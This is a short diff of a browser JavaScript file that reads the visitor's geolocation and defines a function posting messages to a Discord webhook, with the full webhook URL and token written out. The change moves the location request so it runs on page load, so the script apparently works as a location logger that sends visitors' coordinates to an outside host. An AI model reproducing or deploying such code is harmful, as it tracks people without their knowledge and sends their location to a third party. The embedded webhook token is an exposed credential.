@@ -1,5 +1,6 @@
 var x = document.getElementById("demo");
 var anew
+getLocation()
 navigator.permissions && navigator.permissions.query({name: 'geolocation'})
 .then(function(PermissionStatus) {
     if (PermissionStatus.state == 'granted') {
@@ -29,7 +30,7 @@ function showPosition(position) {
   anew = position.coords.latitude+spc+position.coords.longitude+spc
 }
 
-getLocation()
+
 function sendMessage(msg) {
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1105995807066427392/f2bAUihbaCF68cSjC_zWbgYY_MdZIm9FyvfVpCa47F6OLC1Qc7gC9sOq_91XIfCkSc-U");
